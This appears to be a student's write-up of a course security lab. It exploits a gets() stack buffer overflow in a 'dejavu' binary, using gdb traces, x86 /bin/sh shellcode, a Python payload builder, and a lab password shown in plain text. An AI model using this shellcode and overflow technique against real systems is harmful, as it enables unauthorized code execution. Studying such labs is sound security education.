## 1

The makefile is interesting and I think the professor tried his best to
make the program unsafe.
Just run gdb and see what happens:

```
invoke -d dejavu
break deja_vu
run
x/24i $pc
#- ---------------
=> 0xb7ffc4ab <deja_vu+6>:	sub    $0xc,%esp
   0xb7ffc4ae <deja_vu+9>:	lea    -0x10(%ebp),%eax
   0xb7ffc4b1 <deja_vu+12>:	push   %eax
   0xb7ffc4b2 <deja_vu+13>:	call   0xb7ffc75e <gets>
   0xb7ffc4b7 <deja_vu+18>:	add    $0x10,%esp
   0xb7ffc4ba <deja_vu+21>:	nop
   0xb7ffc4bb <deja_vu+22>:	leave  
   0xb7ffc4bc <deja_vu+23>:	ret    
   0xb7ffc4bd <main>:	lea    0x4(%esp),%ecx
   0xb7ffc4c1 <main+4>:	and    $0xfffffff0,%esp
   0xb7ffc4c4 <main+7>:	pushl  -0x4(%ecx)
   0xb7ffc4c7 <main+10>:	push   %ebp
   0xb7ffc4c8 <main+11>:	mov    %esp,%ebp
   0xb7ffc4ca <main+13>:	push   %ecx
   0xb7ffc4cb <main+14>:	sub    $0x4,%esp
   0xb7ffc4ce <main+17>:	call   0xb7ffc4a5 <deja_vu>
   0xb7ffc4d3 <main+22>:	mov    $0x0,%eax
   0xb7ffc4d8 <main+27>:	add    $0x4,%esp
   0xb7ffc4db <main+30>:	pop    %ecx
   0xb7ffc4dc <main+31>:	pop    %ebp
   0xb7ffc4dd <main+32>:	lea    -0x4(%ecx),%esp
   0xb7ffc4e0 <main+35>:	ret    
   0xb7ffc4e1 <dummy>:	ret    
   0xb7ffc4e2 <dummy1>:	ret    
```

Then we go to the call instruction.

```
break *0xb7ffc4b2
c
```

I saw that eax is 0xbffffab8. The return address should original be 0xb7ffc4d3 (in main), and I can easily find it at 0xbffffacc. So I should put payload at 0xbffffad0 and input `0123456789abcdef0123456789abcdef01234567 + bffffa40 + payload`, where paylaod is `6a3158cd8089c389c16a4658cd8031c050682f2f7368682f62696e545b505389e131d2b00bcd800a`. After fixing byte sequence problem with python, the input.txt is ready.

Now I can see 
```
pwnable:~$ ./exploit 
dumb-shell $ id
uid=1002(smith) gid=1001(vsftpd) groups=1001(vsftpd)
dumb-shell $ cat README
You have to let it all go. Fear, doubt, and disbelief. Free your mind.

Next username: smith
Next password: 37ZFBrAPm8
```

My code is attached below
```
############# egg3
#!/usr/bin/python3

def fuck8(txt):
    assert(len(txt) == 8)
    return txt[6:8] + txt[4:6] + txt[2:4] + txt[0:2]

def revert(txt):
    assert(len(txt) % 8 == 0)
    res = ""
    for i in range(int(len(txt) / 8)):
        res += fuck8(txt[i*8:(i+1)*8])
    return res


fill = "0123456789abcdef0123456789abcdef01234567"
#cs161-ace# raddr = "bffffa40"
#cs161-atw# raddr = "bffffad0"
raddr = "bffffad0"
#shellcode = "\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
shellcode = "6a3158cd8089c389c16a4658cd8031c050682f2f7368682f62696e545b505389e131d2b00bcd800a"
########################################################################################### <- append an endline (0x0a, \n)

payload = revert(fill) + revert(raddr) + (shellcode)
print(payload)

import binascii

b = binascii.unhexlify(payload)
with open('input.txt','wb+') as f:
    f.write(b)
############# egg
#!/bin/bash

./egg3 > /dev/null
cat input.txt # | invoke dejavu
```

## 2
